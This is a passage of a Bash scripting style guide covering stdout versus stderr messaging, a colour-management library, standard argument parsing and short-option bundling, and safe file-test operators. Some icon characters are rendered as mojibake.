1. **Operational status**: `info 'Starting backup...'`, `success 'Backup completed'`, `warn 'Size exceeds threshold'`
2. **User diagnostics**: `debug "State: count=$count"`, `info "Using config: $config_file"`
3. **Verbosity-controlled output**: Progress indicators that appear only with `-v` flag
4. **Visual formatting**: Color-coded status with icons ( green success, ² yellow warning,  red error)

**Use plain `echo` for:**

1. **Data output (stdout)**:
```bash
get_user_email() {
  local -- username="$1"
  local -- email
  email=$(grep "^$username:" /etc/passwd | cut -d: -f5)
  echo "$email"  # Data output - must use echo
}
user_email=$(get_user_email 'alice')  # Capture works
```

2. **Help text/documentation**:
```bash
usage() {
  cat <<'EOF'
Usage: script.sh [OPTIONS] FILE...
Options:
  -v, --verbose     Enable verbose output
  -h, --help        Show this help message
EOF
}
```

3. **Structured reports**: Multi-line output that should always display
4. **Parseable/pipeable output**: `list_users | grep '^admin' | wc -l`
5. **Always-display results**: Version info, final summaries, explicitly requested output

**Decision matrix:**

- Status or data? ’ Status = messaging, Data = echo
- Respect verbosity? ’ Yes = messaging, No = echo (or `error` for critical)
- Parsed/piped? ’ Yes = echo to stdout, No = messaging to stderr
- Multi-line formatted? ’ Yes = echo with here-doc, No = messaging (single-line)
- Needs color/formatting? ’ Yes = messaging, No = echo

**Complete example:**

```bash
#!/bin/bash
set -euo pipefail

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_NAME

declare -i VERBOSE=0

# Colors (conditional on terminal)
if [[ -t 1 && -t 2 ]]; then
  RED=$'\033[0;31m'; GREEN=$'\033[0;32m'; CYAN=$'\033[0;36m'; NC=$'\033[0m'
else
  RED=''; GREEN=''; CYAN=''; NC=''
fi
readonly -- RED GREEN CYAN NC

# Messaging Functions (stderr, with verbosity)
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case "${FUNCNAME[1]}" in
    success) prefix+=" ${GREEN}${NC}" ;;
    info)    prefix+=" ${CYAN}É${NC}" ;;
    error)   prefix+=" ${RED}${NC}" ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}

info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
error()   { >&2 _msg "$@"; }

die() {
  local -i exit_code=${1:-1}; shift
  (($#)) && error "$@"
  exit "$exit_code"
}

# Data Functions (stdout, always output)
get_user_home() {
  local -- username="$1" home_dir
  home_dir=$(getent passwd "$username" | cut -d: -f6)
  [[ -z "$home_dir" ]] && return 1
  echo "$home_dir"  # Data to stdout
}

show_report() {
  echo "User Report"
  echo "==========="
  echo "Username: $USER"
  echo "Home: $HOME"
}

usage() {
  cat <<'EOF'
Usage: script.sh [OPTIONS] USERNAME
Options:
  -v, --verbose    Show detailed progress
  -h, --help       Show this help
EOF
}

main() {
  local -- username user_home

  while (($#)); do case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -h|--help)    usage; return 0 ;;
    -*)           die 22 "Invalid option: $1" ;;
    *)            break ;;
  esac; shift; done

  readonly -- VERBOSE

  (($# != 1)) && { error 'Expected exactly one argument'; usage; return 22; }
  username="$1"

  info "Looking up user: $username"  # Operational status to stderr

  if ! user_home=$(get_user_home "$username"); then  # Data capture from stdout
    error "User not found: $username"
    return 1
  fi

  success "Found user: $username"  # Status to stderr
  show_report                       # Data to stdout - always displays
  info 'Report generation complete' # Status to stderr
}

main "$@"
#fin
```

**Output behavior:**

```bash
# Without verbose - only data output visible
$ ./script.sh alice
User Report
===========
Username: alice
Home: /home/alice

# With verbose - status messages to stderr, data to stdout
$ ./script.sh -v alice
script.sh: É Looking up user: alice
script.sh:  Found user: alice
User Report
===========
Username: alice
Home: /home/alice
script.sh: É Report generation complete

# Pipe output - only stdout data piped, stderr messages still visible
$ ./script.sh -v alice | grep Username
script.sh: É Looking up user: alice
script.sh:  Found user: alice
Username: alice
script.sh: É Report generation complete
```

**Critical anti-patterns:**

```bash
#  Wrong - info() for data output
get_user_email() {
  info "$email"  # Goes to stderr! Can't be captured!
}
email=$(get_user_email 'alice')  # $email is empty!

#  Correct - echo for data
get_user_email() {
  echo "$email"  # Goes to stdout, capturable
}

#  Wrong - echo for operational status
process_file() {
  echo "Processing $file..."  # Mixes with data on stdout!
  cat "$file"
}

#  Correct - messaging for status
process_file() {
  info "Processing $file..."  # Status to stderr, separated
  cat "$file"                  # Data to stdout
}

#  Wrong - help text using info()
show_help() {
  info 'Usage: script.sh [OPTIONS]'  # Won't display if VERBOSE=0!
}

#  Correct - help uses echo/cat
show_help() {
  cat <<'EOF'
Usage: script.sh [OPTIONS]
EOF
}

#  Wrong - error to stdout
validate_input() {
  [[ ! -f "$1" ]] && echo "File not found: $1"  # Wrong stream!
}

#  Correct - error to stderr
validate_input() {
  [[ ! -f "$1" ]] && error "File not found: $1"  # Correct stream
}

#  Wrong - data respects VERBOSE
get_count() {
  ((VERBOSE)) && echo "$count"  # Data missing if VERBOSE=0!
}

#  Correct - data always outputs
get_count() {
  echo "$count"  # Always outputs
}
```

**Edge cases:**

**1. Version output (always display):**
```bash
show_version() {
  echo "$SCRIPT_NAME $VERSION"  # Use echo, not info()
}
```

**2. Progress during data generation:**
```bash
generate_data() {
  info 'Generating data...'  # Progress to stderr
  for ((i=1; i<=100; i++)); do
    echo "line $i"            # Data to stdout
  done
  success 'Complete'          # Status to stderr
}
data=$(generate_data)  # Captures data, sees progress
```

**3. Error context in functions:**
```bash
validate_config() {
  local -- config_file="$1"
  [[ ! -f "$config_file" ]] && { error "Config not found: $config_file"; return 2; }
  [[ ! -r "$config_file" ]] && { error "Config not readable: $config_file"; return 5; }
  return 0
}
validate_config "$config" || die $? 'Validation failed'
```

**Summary:**

- **Messaging functions**: Operational status, diagnostics, user-facing (stderr, respects verbosity)
- **Plain echo**: Data output, help, reports, parseable content (stdout, always displays)
- **Stream separation**: Status to stderr via messaging, data to stdout via echo
- **Enables composition**: Scripts can be piped without mixing operational messages and data
- **Key principle**: Echo = what the script produces (data), messaging = how it's working (status)


---


**Rule: BCS0906**

## Color Management Library

For scripts requiring sophisticated color management beyond inline declarations (BCS0901), use a dedicated library providing a two-tier system, automatic terminal detection, and BCS _msg integration (BCS0903).

**Rationale:**

- **Two-tier system**: Basic (5 vars) vs complete (12 vars) prevents namespace pollution while offering flexibility
- **Auto-detection**: Checks both stdout AND stderr for TTY, with force-on/off override options
- **BCS Integration**: `flags` option sets standard control variables (VERBOSE, DEBUG, DRY_RUN, PROMPT) for _msg system
- **Dual-purpose pattern**: Works as sourceable library (BCS010201) or standalone executable with demonstration mode
- **Centralized maintenance**: Single source for all color definitions across scripts

**Two-Tier Color System:**

**Basic tier (default)** - 5 variables:
```bash
NC          # No Color / Reset
RED         # Error messages
GREEN       # Success messages
YELLOW      # Warnings
CYAN        # Information
```

**Complete tier (opt-in)** - 12 variables (basic + 7 more):
```bash
BLUE MAGENTA BOLD ITALIC UNDERLINE DIM REVERSE
```

**Library Function:**

```bash
color_set [OPTIONS...]
```

**Options (combinable):**

| Option | Description |
|--------|-------------|
| `basic` | Enable basic 5-variable set (default) |
| `complete` | Enable complete 12-variable set |
| `auto` | Auto-detect terminal (stdout AND stderr TTY check) (default) |
| `always` | Force colors on (piped/redirected output) |
| `never`, `none` | Force colors off |
| `verbose`, `-v` | Print all variable declarations |
| `flags` | Set BCS _msg globals: VERBOSE, DEBUG, DRY_RUN, PROMPT |

**Implementation:**

```bash
#!/bin/bash
# color-set.sh - Color management library

color_set() {
  local -i color=-1 complete=0 verbose=0 flags=0
  while (($#)); do
    case ${1:-auto} in
      complete) complete=1 ;;
      basic)    complete=0 ;;
      flags)    flags=1 ;;
      verbose|-v|--verbose) verbose=1 ;;
      always)   color=1 ;;
      never|none) color=0 ;;
      auto)     color=-1 ;;
      *)        >&2 echo "$FUNCNAME: error: Invalid option ${1@Q}"
                return 1 ;;
    esac
    shift
  done

  # Auto-detect: both stdout AND stderr must be TTY
  ((color == -1)) && { [[ -t 1 && -t 2 ]] && color=1 || color=0; }

  # Set BCS control flags if requested
  if ((flags)); then
    declare -ig VERBOSE=${VERBOSE:-1}
    ((complete)) && declare -ig DEBUG=0 DRY_RUN=1 PROMPT=1 || :
  fi

  # Declare color variables
  if ((color)); then
    declare -g NC=$'\033[0m' RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m'
    ((complete)) && declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' BOLD=$'\033[1m' ITALIC=$'\033[3m' UNDERLINE=$'\033[4m' DIM=$'\033[2m' REVERSE=$'\033[7m' || :
  else
    declare -g NC='' RED='' GREEN='' YELLOW='' CYAN=''
    ((complete)) && declare -g BLUE='' MAGENTA='' BOLD='' ITALIC='' UNDERLINE='' DIM='' REVERSE='' || :
  fi

  # Verbose output if requested
  if ((verbose)); then
    ((flags)) && declare -p VERBOSE || :
    declare -p NC RED GREEN YELLOW CYAN
    ((complete)) && {
      ((flags)) && declare -p DEBUG DRY_RUN PROMPT || :
      declare -p BLUE MAGENTA BOLD ITALIC UNDERLINE DIM REVERSE
    } || :
  fi

  return 0
}
declare -fx color_set

# Dual-purpose pattern: early return when sourced
[[ ${BASH_SOURCE[0]} == "$0" ]] || return 0

# Executable section (only runs when executed directly)
#!/bin/bash #semantic
set -euo pipefail

# Help handling
if [[ ${1:-} =~ ^(-h|--help|help)$ ]]; then
  cat <<'HELP'
Usage: color-set.sh [OPTIONS...]

Dual-purpose bash library for terminal color management.

OPTIONS:
  complete          Enable complete color set (12 variables)
  basic             Enable basic color set (5 variables) [default]
  always            Force colors on
  never, none       Force colors off
  auto              Auto-detect TTY [default]
  verbose, -v       Print variable declarations
  flags             Set BCS globals (VERBOSE, DEBUG, DRY_RUN, PROMPT)
  --help, -h        Display this help

EXAMPLES:
  ./color-set.sh complete verbose
  source color-set.sh && color_set complete flags
HELP
  exit 0
fi

color_set "$@"

#fin
```

**Usage Examples:**

**Basic usage:**
```bash
source color-set.sh
color_set basic
echo "${RED}Error:${NC} Operation failed"
```

**Complete tier with attributes:**
```bash
source color-set.sh
color_set complete
echo "${BOLD}${RED}CRITICAL ERROR${NC}"
echo "${ITALIC}${CYAN}Note:${NC} ${DIM}Additional details${NC}"
```

**Integrated with BCS _msg system:**
```bash
source color-set.sh
color_set complete flags

# Now have colors AND messaging control variables
info "Starting process"        # Uses CYAN, respects VERBOSE
success "Build completed"       # Uses GREEN
error "Connection failed"       # Uses RED
```

**Force colors for piped output:**
```bash
source color-set.sh
color_set complete always
./script.sh | less -R  # Colors preserved
```

**Anti-patterns:**

âŒ **Testing only stdout** (fails when stderr redirected):
```bash
# DON'T: Incomplete terminal detection
[[ -t 1 ]] && color=1
# DO: Test both streams
[[ -t 1 && -t 2 ]] && color=1
```

âŒ **Loading complete tier unnecessarily** (namespace pollution):
```bash
# DON'T: Use complete when only need basic colors
color_set complete  # Wasteful if only using RED/GREEN/YELLOW/CYAN
# DO: Use basic tier
color_set basic
```

âŒ **Scattered inline declarations** (duplicates across scripts):
```bash
# DON'T: Repeat declarations in every script
RED=$'\033[0;31m'
GREEN=$'\033[0;32m'
# DO: Source centralized library
source color-set.sh && color_set basic
```

**Reference:** `/usr/local/lib/color-set.sh` or https://github.com/Open-Technology-Foundation/bash-libs/color-set

**Cross-References:**
- **BCS0901** - Basic inline color pattern
- **BCS0903** - Core message functions using these colors
- **BCS010201** - Dual-purpose script pattern

**Ref:** BCS0906


---


**Rule: BCS1000**

# Command-Line Arguments

This section establishes the standard argument parsing pattern supporting both short options (`-h`, `-v`) and long options (`--help`, `--version`), ensuring consistent command-line interfaces. It defines the canonical version output format (`scriptname X.Y.Z`), validation patterns for required arguments and option conflicts, and guidance on argument parsing placement (main function vs top-level) based on script complexity. These patterns make scripts predictable, user-friendly, and maintainable for both interactive and automated usage.


---


**Rule: BCS1001**

## Standard Argument Parsing Pattern

**Complete pattern with short option support:**

```bash
while (($#)); do case $1 in
  -a|--add)       noarg "$@"; shift
                  process_argument "$1" ;;
  -m|--depth)     noarg "$@"; shift
                  max_depth="$1" ;;
  -L|--follow-symbolic)
                  symbolic='-L' ;;

  -p|--prompt)    PROMPT=1; VERBOSE=1 ;;
  -v|--verbose)   VERBOSE+=1 ;;

  -q|--quiet)     VERBOSE=0 ;;
  -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;

  -h|--help)      show_help; exit 0 ;;
  -[amLpvqVh]*) #shellcheck disable=SC2046 #split up single options
                  set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
  -*)             die 22 "Invalid option '$1'" ;;
  *)              Paths+=("$1") ;;
esac; shift; done
```

**Pattern breakdown:**

**1. Loop structure:** `while (($#)); do ... done` - Arithmetic test `(($#))` is more efficient than `[[ $# -gt 0 ]]`, exits when no arguments remain.

**2. Case statement:** `case $1 in ... esac` - Supports multiple patterns per branch (`-a|--add`), more readable than if/elif chains.

**3. Options with arguments:**
```bash
-m|--depth)     noarg "$@"; shift
                max_depth="$1" ;;
```
- `noarg "$@"` validates argument exists (prevents errors)
- First `shift` moves to value, assigns to variable
- Second `shift` (at loop end) moves past value

**4. Options without arguments (flags):**
```bash
-p|--prompt)    PROMPT=1; VERBOSE=1 ;;
-v|--verbose)   VERBOSE+=1 ;;
```
- Set variables directly, no extra shift needed
- `VERBOSE+=1` allows stacking: `-vvv` = `VERBOSE=3`

**5. Options that exit immediately:**
```bash
-V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
-h|--help)      show_help; exit 0 ;;
```
- Print and exit, no shift needed

**6. Short option bundling:**
```bash
-[amLpvqVh]*) #shellcheck disable=SC2046 #split up single options
              set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
```
- Allows `-vpL` instead of `-v -p -L`
- Splits bundled options: `-vpL file` ’ `-v -p -L file`
- Mechanism: `${1:1}` removes dash, `grep -o .` splits characters, `printf -- "-%c "` adds dashes, `set --` replaces argument list

**7. Invalid option handling:**
```bash
-*)             die 22 "Invalid option '$1'" ;;
```
- Exit code 22 (EINVAL - invalid argument)

**8. Positional arguments:**
```bash
*)              Paths+=("$1") ;;
```
- Appends non-options to array

**9. Mandatory shift at end:**
```bash
esac; shift; done
```
- Critical: Without this, infinite loop occurs

**The `noarg` helper:**

```bash
noarg() {
  (($# > 1)) || die 2 "Option '$1' requires an argument"
}
```
- Validates option has argument: `(($# > 1))` checks at least 2 args (option + value)
- Always call before shifting to capture value

**Complete example:**

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Default values
declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -- output_file=''
declare -a files=()

# ============================================================================
# Utility Functions
# ============================================================================

error() {
  >&2 echo "[$SCRIPT_NAME] ERROR: $*"
}

die() {
  local -i exit_code=$1
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}

noarg() {
  (($# > 1)) || die 2 "Option '$1' requires an argument"
}

show_help() {
  cat <<EOF
Usage: $SCRIPT_NAME [OPTIONS] FILE...

Process files with various options.

Options:
  -o, --output FILE  Output file (required)
  -v, --verbose      Verbose output
  -n, --dry-run      Dry-run mode
  -V, --version      Show version
  -h, --help         Show this help

Examples:
  $SCRIPT_NAME -o output.txt file1.txt file2.txt
  $SCRIPT_NAME -v -n -o result.txt *.txt
EOF
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -o|--output)    noarg "$@"; shift
                    output_file=$1 ;;
    -v|--verbose)   VERBOSE+=1 ;;
    -n|--dry-run)   DRY_RUN=1 ;;
    -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -h|--help)      show_help; exit 0 ;;

    # Short option bundling support
    -[ovnVh]*)    #shellcheck disable=SC2046
                    set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
    -*)             die 22 "Invalid option '$1'" ;;
    *)              files+=("$1") ;;
  esac; shift; done

  # Make variables readonly after parsing
  readonly -- VERBOSE DRY_RUN output_file
  readonly -a files

  # Validate required arguments
  ((${#files[@]} > 0)) || die 2 'No input files specified'
  [[ -n "$output_file" ]] || die 2 'Output file required (use -o)'

  # Use parsed arguments
  ((VERBOSE)) && echo "Processing ${#files[@]} files"
  ((DRY_RUN)) && echo '[DRY RUN] Would write to:' "$output_file"

  # Process files
  local -- file
  for file in "${files[@]}"; do
    ((VERBOSE)) && echo "Processing: $file"
    # Processing logic here
  done

  ((VERBOSE)) && echo "Would write results to: $output_file"
}

main "$@"

#fin
```

**Short option bundling examples:**

```bash
# Equivalent forms:
./script -v -n -o output.txt file.txt
./script -vno output.txt file.txt

# Stacked verbose:
./script -v -v -v file.txt
./script -vvv file.txt
```

**Anti-patterns:**

```bash
#  Wrong - verbose loop test
while [[ $# -gt 0 ]]; do

#  Correct
while (($#)); do

#  Wrong - missing noarg validation
-o|--output)    shift
                output_file=$1 ;;  # Fails if no argument

#  Correct
-o|--output)    noarg "$@"; shift
                output_file=$1 ;;

#  Wrong - missing shift at loop end
while (($#)); do case $1 in
  ...
esac; done  # Infinite loop

#  Correct
while (($#)); do case $1 in
  ...
esac; shift; done

#  Wrong - if/elif chains
if [[ "$1" == '-v' ]] || [[ "$1" == '--verbose' ]]; then
  VERBOSE+=1
elif [[ "$1" == '-h' ]] || [[ "$1" == '--help' ]]; then
  show_help
fi

#  Correct - case statement
case $1 in
  -v|--verbose) VERBOSE+=1 ;;
  -h|--help)    show_help; exit 0 ;;
esac
```

**Rationale:** Consistent structure for all scripts, handles options with/without arguments plus short bundling, validates arguments before use, case statement more scannable than if/elif, arithmetic test `(($#))` more efficient, follows Unix conventions.


---


**Rule: BCS1002**

## Version Output Format

**Standard format:** `<script_name> <version_number>`

The `--version` option outputs script name, space, version number. Do **not** include the word "version" between them.

```bash
#  Correct
-V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
# Output: myscript 1.2.3

#  Wrong - includes "version" word
-V|--version)   echo "$SCRIPT_NAME version $VERSION"; exit 0 ;;
# Output: myscript version 1.2.3
```

**Rationale:** Follows GNU standards and Unix/Linux utility conventions (e.g., `bash --version` outputs "GNU bash, version 5.2.15").


---


**Rule: BCS1003**

## Argument Validation
```bash
noarg() { (($# > 1)) && [[ ${2:0:1} != '-' ]] || die 2 "Missing argument for option '$1'"; }
```


---


**Rule: BCS1004**

## Argument Parsing Location

**Recommendation:** Place argument parsing inside `main()` rather than top-level.

**Benefits:**
- Better testability (test `main()` with different arguments)
- Cleaner scoping (parsing vars local to `main()`)
- Encapsulation (argument handling part of execution flow)
- Easier mocking in unit tests

```bash
# Recommended: Parsing inside main()
main() {
  # Parse command-line arguments
  while (($#)); do
    case $1 in
      --builtin)    INSTALL_BUILTIN=1
                    BUILTIN_REQUESTED=1
                    ;;
      --no-builtin) SKIP_BUILTIN=1
                    ;;
      --prefix)     shift
                    PREFIX="$1"
                    # Update derived paths
                    BIN_DIR="$PREFIX"/bin
                    LOADABLE_DIR="$PREFIX"/lib/bash/loadables
                    ;;
      -h|--help)    show_help
                    exit 0
                    ;;
      -*)           die 22 "Invalid option '$1'"
                    ;;
      *)            >&2 show_help
                    die 2 "Unknown option '$1'"
                    ;;
    esac
    shift
  done

  # Proceed with main logic
  check_prerequisites
  build_components
  install_components
}

main "$@"
#fin
```

**Alternative:** Simple scripts (< 200 lines) without `main()` may parse at top-level:

```bash
#!/bin/bash
set -euo pipefail

# Simple scripts can parse at top level
while (($#)); do case $1 in
  -v|--verbose) VERBOSE=1 ;;
  -h|--help)    show_help; exit 0 ;;
  -*)           die 22 "Invalid option '$1'" ;;
  *)            FILES+=("$1") ;;
esac; shift; done

# Rest of simple script logic
```


---


**Rule: BCS1005**

## Short-Option Disaggregation in Command-Line Processing Loops

## Overview

Short-option disaggregation splits bundled short options (e.g., `-abc`) into individual options (`-a -b -c`) for processing. This follows Unix conventions allowing users to write `script -vvn` instead of `script -v -v -n`.

Without disaggregation, scripts treat `-lha` as a single unknown option rather than three separate options.

## The Three Methods

### Method 1: grep (Current Standard)

```bash
-[amLpvqVh]*) #shellcheck disable=SC2046 #split up aggregated short options
  set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}"
  ;;
```

**How it works:** `${1:1}` removes leading dash, `grep -o .` outputs each character on separate line, `printf -- "-%c "` adds dash before each, `set --` replaces argument list.

**Pros:** Compact one-liner, well-tested, reliable
**Cons:** External `grep` dependency, ~190 iter/sec, requires SC2046 disable, subprocess overhead
**Performance:** ~190 iterations/second

### Method 2: fold (Alternative)

```bash
-[amLpvqVh]*) #split up aggregated short options
  set -- '' $(printf -- "-%c " $(fold -w1 <<<"${1:1}")) "${@:2}"
  ;;
```

**How it works:** `fold -w1` wraps text at 1-character width (splits each char to own line), rest identical to grep method.

**Pros:** 3% faster than grep (~195 iter/sec), semantically correct for line wrapping
**Cons:** External dependency, SC2046 disable, marginal improvement, subprocess overhead
**Performance:** ~195 iterations/second

### Method 3: Pure Bash (Recommended)

```bash
-[amLpvqVh]*) # Split up single options (pure bash)
  local -- opt=${1:1}
  local -a new_args=()
  while ((${#opt})); do
    new_args+=("-${opt:0:1}")
    opt=${opt:1}
  done
  set -- '' "${new_args[@]}" "${@:2}"
  ;;
```

**How it works:** Extract first character with `${opt:0:1}`, prepend dash, append to array, remove first character with `${opt:1}`, loop until string empty.

**Pros:** 68% faster (~318 iter/sec), no external dependencies, no shellcheck warnings, portable, no subprocess overhead
**Cons:** More verbose (6 lines vs 1), slightly more complex logic
**Performance:** ~318 iterations/second

## Performance Comparison

| Method | Iter/Sec | Relative Speed | External Deps | Shellcheck |
|--------|----------|----------------|---------------|------------|
| grep | 190.82 | Baseline | grep | SC2046 disable |
| fold | 195.25 | +2.3% | fold | SC2046 disable |
| **Pure Bash** | **317.75** | **+66.5%** | **None** | **Clean** |

## Implementation Examples

### Example 1: grep method

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

declare -i VERBOSE=0 DRY_RUN=0
declare -- output_file=''
declare -a files=()

error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($#>1)) && error "$@"; exit ${1:-0}; }
noarg() { (($# > 1)) || die 2 "Option '$1' requires an argument"; }

main() {
  while (($#)); do case $1 in
    -o|--output)    noarg "$@"; shift; output_file=$1 ;;
    -n|--dry-run)   DRY_RUN=1 ;;
    -v|--verbose)   VERBOSE+=1 ;;
    -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -h|--help)      show_help; exit 0 ;;

    -[onvVh]*) #shellcheck disable=SC2046
                    set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
    -*)             die 22 "Invalid option '$1'" ;;
    *)              files+=("$1") ;;
  esac; shift; done

  readonly -- VERBOSE DRY_RUN output_file
  readonly -a files

  ((${#files[@]} > 0)) || die 2 'No input files specified'
  [[ -n "$output_file" ]] || die 2 'Output file required (use -o)'

  ((VERBOSE)) && echo "Processing ${#files[@]} files"
  ((DRY_RUN)) && echo "[DRY RUN] Would write to ${output_file@Q}"
}

main "$@"
#fin
```

### Example 2: Pure Bash (Recommended)

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

declare -i VERBOSE=0 PARALLEL=1
declare -- mode='normal'
declare -a targets=()

error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($#>1)) && error "$@"; exit ${1:-0}; }
noarg() { (($# > 1)) || die 2 "Option '$1' requires an argument"; }

main() {
  while (($#)); do case $1 in
    -m|--mode)      noarg "$@"; shift; mode=$1 ;;
    -j|--parallel)  noarg "$@"; shift; PARALLEL=$1 ;;
    -v|--verbose)   VERBOSE+=1 ;;
    -q|--quiet)     VERBOSE=0 ;;
    -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -h|--help)      show_help; exit 0 ;;

    -[mjvqVh]*) # Split up single options (pure bash)
                    local -- opt=${1:1}
                    local -a new_args=()
                    while ((${#opt})); do
                      new_args+=("-${opt:0:1}")
                      opt=${opt:1}
                    done
                    set -- '' "${new_args[@]}" "${@:2}" ;;
    -*)             die 22 "Invalid option '$1'" ;;
    *)              targets+=("$1") ;;
  esac; shift; done

  readonly -- VERBOSE PARALLEL mode
  readonly -a targets

  ((${#targets[@]} > 0)) || die 2 'No targets specified'
  [[ "$mode" =~ ^(normal|fast|safe)$ ]] || die 2 "Invalid mode: '$mode'"
  ((PARALLEL > 0)) || die 2 'Parallel jobs must be positive'

  ((VERBOSE)) && echo "Processing ${#targets[@]} targets with $PARALLEL jobs in $mode mode"
}

main "$@"
#fin
```

## Edge Cases

### Options Requiring Arguments

Options with arguments cannot be in bundle middle:

```bash
#  Correct - option with argument at end or separate
./script -vno output.txt file.txt    # -v -n -o output.txt
./script -vn -o output.txt file.txt  # -v -n -o output.txt

#  Wrong - option with argument in middle
./script -von output.txt file.txt    # -v -o -n output.txt
                                      # -o captures "n" as argument!
```

**Solution:** Document that options requiring arguments should be at bundle end, used separately, or use long-form.

### Character Set Validation

Pattern `-[amLpvqVh]*` explicitly lists valid options, preventing incorrect disaggregation of unknown options:

```bash
-[ovnVh]*)  # Only -o -v -n -V -h are valid short options

./script -xyz  # Doesn't match pattern, caught by -*) case ’ Error: Invalid option '-xyz'
```

## Implementation Checklist

- [ ] List all valid short options in pattern: `-[ovnVh]*`
- [ ] Place disaggregation case before `-*)` invalid option case
- [ ] Ensure `shift` happens at end of loop for all cases
- [ ] Document which options can be bundled
- [ ] Warn users about options-with-arguments bundling limitations
- [ ] Add shellcheck disable comment for grep/fold methods
- [ ] Test with: single options, bundled options, mixed long/short
- [ ] Verify stacking behavior for flags (e.g., `-vvv`)

## Recommendations

### For New Scripts

**Use Pure Bash Method (Method 3)** - 68% faster, no external dependencies, no shellcheck warnings, portable.

Trade-off: Slightly more verbose (6 lines vs 1 line).

### For Existing Scripts

**Keep grep method unless:**
- Performance is critical
- Script called frequently
- External dependencies a concern
- Running in restricted environment

### For High-Performance Scripts

**Always use pure bash method** for scripts:
- Called in tight loops
- Part of build systems
- Interactive tools (tab completion, prompts)
- Running in containers/restricted environments
- Called thousands of times per session

## Testing

```bash
# Test single options
./script -v -v -n file.txt

# Test bundled options
./script -vvn file.txt

# Test mixed
./script -v --verbose -n file.txt

# Test with arguments
./script -vno output.txt file.txt

# Test invalid options (should error)
./script -xyz

# Test option stacking (VERBOSE should be 5)
./script -vvvvv
```

## Conclusion

Short-option disaggregation follows Unix conventions. Pure bash method offers 68% performance advantage with no external dependencies.

**Summary:**
- **grep:** Current standard, external dependency, ~190 iter/sec
- **fold:** Marginal improvement, external dependency, ~195 iter/sec
- **Pure bash:** Recommended, no dependencies, ~318 iter/sec (68% faster)

Choose pure bash for new development unless one-liner brevity outweighs performance and dependency concerns.

#fin


---


**Rule: BCS1100**

# File Operations

Safe file handling practices: proper file test operators (`-e`, `-f`, `-d`, `-r`, `-w`, `-x`) with explicit quoting, safe wildcard patterns using explicit paths (`rm ./*` never `rm *`), process substitution (`< <(command)`) to avoid subshell variable issues, and here document patterns for multi-line input. These prevent accidental deletion, handle special characters safely, and ensure reliable operations across environments.


---


**Rule: BCS1101**

## Safe File Testing

**Always quote variables and use `[[ ]]` for file tests:**

```bash
# Basic file testing
[[ -f "$file" ]] && source "$file"
[[ -d "$path" ]] || die 1 "Not a directory: $path"
[[ -r "$file" ]] || warn "Cannot read: $file"
[[ -x "$script" ]] || die 1 "Not executable: $script"

# Multiple conditions
if [[ -f "$config" && -r "$config" ]]; then
  source "$config"
else
  die 3 "Config file not found or not readable: $config"
fi

# File emptiness
[[ -s "$logfile" ]] || warn 'Log file is empty'

# Timestamp comparison
if [[ "$source" -nt "$destination" ]]; then
  cp "$source" "$destination"
fi
```

**File test operators:**

| Operator | Returns True If |
|----------|----------------|
| `-e file` | File exists (any type) |
| `-f file` | Regular file exists |
| `-d dir` | Directory exists |
| `-L link` | Symbolic link exists |
| `-p pipe` | Named pipe (FIFO) exists |
| `-S sock` | Socket exists |
| `-b file` | Block device exists |
| `-c file` | Character device exists |

**Permission tests:**

| Operator | Returns True If |
|----------|----------------|
| `-r file` | File is readable |
| `-w file` | File is writable |
| `-x file` | File is executable |
| `-s file` | File is not empty (size > 0) |
| `-u file` | File has SUID bit set |
| `-g file` | File has SGID bit set |
| `-k file` | File has sticky bit set |
| `-O file` | You own the file |
| `-G file` | File's group matches yours |
| `-N file` | File modified since last read |

**File comparison:**

| Operator | Returns True If |
|----------|----------------|
| `file1 -nt file2` | file1 is newer than file2 (modification time) |
| `file1 -ot file2` | file1 is older than file2 |
| `file1 -ef file2` | file1 and file2 have same device and inode |

**Rationale:**

- **Always quote** `"$file"` - prevents word splitting and glob expansion
